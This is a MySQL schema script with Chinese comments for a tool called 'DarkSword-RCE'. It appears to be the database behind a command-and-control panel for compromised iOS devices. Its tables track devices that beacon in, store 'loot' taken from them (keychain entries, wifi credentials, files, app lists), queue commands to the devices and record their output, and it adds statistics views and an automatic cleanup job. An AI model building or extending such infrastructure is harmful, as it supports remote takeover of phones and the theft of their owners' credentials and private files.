-- DarkSword-RCE MySQL 5.7 数据库结构
-- 创建时间: 2026-06-13
-- 兼容: MySQL 5.7+

-- 创建数据库
CREATE DATABASE IF NOT EXISTS darksword_rce
  DEFAULT CHARACTER SET utf8mb4
  DEFAULT COLLATE utf8mb4_unicode_ci;

USE darksword_rce;

-- ==========================================
-- 1. 设备表
-- ==========================================
CREATE TABLE IF NOT EXISTS devices (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL UNIQUE COMMENT '设备唯一标识',
  device_name VARCHAR(255) DEFAULT NULL COMMENT '设备名称',
  model VARCHAR(100) DEFAULT NULL COMMENT '设备型号',
  ios_version VARCHAR(50) DEFAULT NULL COMMENT 'iOS 版本',
  ua TEXT DEFAULT NULL COMMENT 'User Agent',
  ip VARCHAR(45) DEFAULT NULL COMMENT 'IP 地址（支持 IPv6）',
  stage VARCHAR(50) DEFAULT 'beacon' COMMENT '当前阶段',
  exec_status VARCHAR(50) DEFAULT 'pending' COMMENT '执行状态: pending/running/success/failed',
  extra JSON DEFAULT NULL COMMENT '扩展信息（JSON）',
  first_seen_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '首次上报时间',
  last_seen_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '最后上报时间',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_device_id (device_id),
  INDEX idx_stage (stage),
  INDEX idx_exec_status (exec_status),
  INDEX idx_last_seen (last_seen_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='设备信息表';

-- ==========================================
-- 2. Loot 数据表
-- ==========================================
CREATE TABLE IF NOT EXISTS loot_data (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL COMMENT '设备 ID',
  loot_type VARCHAR(50) NOT NULL COMMENT '数据类型: keychain/wifi/file/apps/info',
  data_json JSON NOT NULL COMMENT 'Loot 数据（JSON）',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_device_id (device_id),
  INDEX idx_loot_type (loot_type),
  INDEX idx_created_at (created_at),
  FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Loot 数据表';

-- ==========================================
-- 3. 文件表（Loot 文件单独存储）
-- ==========================================
CREATE TABLE IF NOT EXISTS loot_files (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL COMMENT '设备 ID',
  filename VARCHAR(255) NOT NULL COMMENT '文件名',
  file_size BIGINT UNSIGNED DEFAULT 0 COMMENT '文件大小（字节）',
  file_path VARCHAR(500) DEFAULT NULL COMMENT '磁盘存储路径',
  saved TINYINT(1) DEFAULT 0 COMMENT '是否已保存到磁盘',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_device_id (device_id),
  INDEX idx_filename (filename),
  FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Loot 文件表';

-- ==========================================
-- 4. 命令队列表
-- ==========================================
CREATE TABLE IF NOT EXISTS cmd_queue (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  cmd_id VARCHAR(64) NOT NULL UNIQUE COMMENT '命令 ID',
  device_id VARCHAR(64) NOT NULL COMMENT '目标设备 ID',
  cmd_type VARCHAR(50) NOT NULL COMMENT '命令类型',
  cmd_args JSON DEFAULT NULL COMMENT '命令参数（JSON）',
  status VARCHAR(50) DEFAULT 'pending' COMMENT '状态: pending/sent/completed/failed',
  issued_by VARCHAR(100) DEFAULT 'admin' COMMENT '下发者',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_cmd_id (cmd_id),
  INDEX idx_device_id (device_id),
  INDEX idx_status (status),
  INDEX idx_created_at (created_at),
  FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='命令队列表';

-- ==========================================
-- 5. 命令结果表
-- ==========================================
CREATE TABLE IF NOT EXISTS cmd_results (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  cmd_id VARCHAR(64) NOT NULL COMMENT '命令 ID',
  device_id VARCHAR(64) NOT NULL COMMENT '设备 ID',
  cmd_type VARCHAR(50) NOT NULL COMMENT '命令类型',
  output TEXT DEFAULT NULL COMMENT '命令输出',
  status VARCHAR(50) DEFAULT 'done' COMMENT '执行状态: done/error',
  bridge_ready TINYINT(1) DEFAULT NULL COMMENT 'Native Bridge 是否就绪',
  reason VARCHAR(255) DEFAULT NULL COMMENT '失败原因',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_cmd_id (cmd_id),
  INDEX idx_device_id (device_id),
  INDEX idx_created_at (created_at),
  FOREIGN KEY (cmd_id) REFERENCES cmd_queue(cmd_id) ON DELETE CASCADE,
  FOREIGN KEY (device_id) REFERENCES devices(device_id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='命令结果表';

-- ==========================================
-- 6. Session 表
-- ==========================================
CREATE TABLE IF NOT EXISTS sessions (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  session_id VARCHAR(64) NOT NULL UNIQUE COMMENT 'Session ID',
  username VARCHAR(100) NOT NULL COMMENT '用户名',
  csrf_token VARCHAR(64) NOT NULL COMMENT 'CSRF Token',
  expires_at DATETIME NOT NULL COMMENT '过期时间',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_session_id (session_id),
  INDEX idx_expires_at (expires_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Session 表';

-- ==========================================
-- 7. 系统日志表（可选）
-- ==========================================
CREATE TABLE IF NOT EXISTS system_logs (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  log_level VARCHAR(20) NOT NULL COMMENT '日志级别: INFO/WARN/ERROR',
  log_type VARCHAR(50) NOT NULL COMMENT '日志类型: auth/device/cmd/loot/system',
  device_id VARCHAR(64) DEFAULT NULL COMMENT '关联设备 ID',
  message TEXT NOT NULL COMMENT '日志内容',
  extra JSON DEFAULT NULL COMMENT '扩展信息（JSON）',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_log_level (log_level),
  INDEX idx_log_type (log_type),
  INDEX idx_device_id (device_id),
  INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='系统日志表';

-- ==========================================
-- 初始化视图（统计查询）
-- ==========================================

-- 设备统计视图
CREATE OR REPLACE VIEW v_device_stats AS
SELECT
  COUNT(*) AS total_devices,
  COUNT(CASE WHEN exec_status = 'success' THEN 1 END) AS success_count,
  COUNT(CASE WHEN exec_status = 'running' THEN 1 END) AS running_count,
  COUNT(CASE WHEN exec_status = 'failed' THEN 1 END) AS failed_count,
  COUNT(CASE WHEN exec_status = 'pending' THEN 1 END) AS pending_count,
  COUNT(CASE WHEN last_seen_at > DATE_SUB(NOW(), INTERVAL 5 MINUTE) THEN 1 END) AS online_count
FROM devices;

-- Loot 统计视图（按设备）
CREATE OR REPLACE VIEW v_loot_stats AS
SELECT
  device_id,
  COUNT(CASE WHEN loot_type = 'keychain' THEN 1 END) AS keychain_count,
  COUNT(CASE WHEN loot_type = 'wifi' THEN 1 END) AS wifi_count,
  COUNT(CASE WHEN loot_type = 'info' THEN 1 END) AS info_count,
  (SELECT COUNT(*) FROM loot_files WHERE loot_files.device_id = loot_data.device_id) AS file_count
FROM loot_data
GROUP BY device_id;

-- ==========================================
-- 清理过期数据存储过程
-- ==========================================

DELIMITER $$

CREATE PROCEDURE IF NOT EXISTS sp_cleanup_expired_data()
BEGIN
  -- 清理过期 Session（超过 7 天）
  DELETE FROM sessions WHERE expires_at < DATE_SUB(NOW(), INTERVAL 7 DAY);
  
  -- 清理旧日志（超过 30 天）
  DELETE FROM system_logs WHERE created_at < DATE_SUB(NOW(), INTERVAL 30 DAY);
  
  -- 清理长时间未上报的设备（超过 30 天）
  DELETE FROM devices WHERE last_seen_at < DATE_SUB(NOW(), INTERVAL 30 DAY);
  
  SELECT ROW_COUNT() AS affected_rows;
END$$

DELIMITER ;

-- ==========================================
-- 创建定时清理任务（需要 MySQL Event Scheduler）
-- ==========================================

-- 启用 Event Scheduler
SET GLOBAL event_scheduler = ON;

-- 每天凌晨 2 点清理过期数据
CREATE EVENT IF NOT EXISTS evt_cleanup_expired
ON SCHEDULE EVERY 1 DAY
STARTS (TIMESTAMP(CURRENT_DATE) + INTERVAL 1 DAY + INTERVAL 2 HOUR)
DO CALL sp_cleanup_expired_data();

-- ==========================================
-- 完成
-- ==========================================

SELECT '数据库结构创建完成' AS status;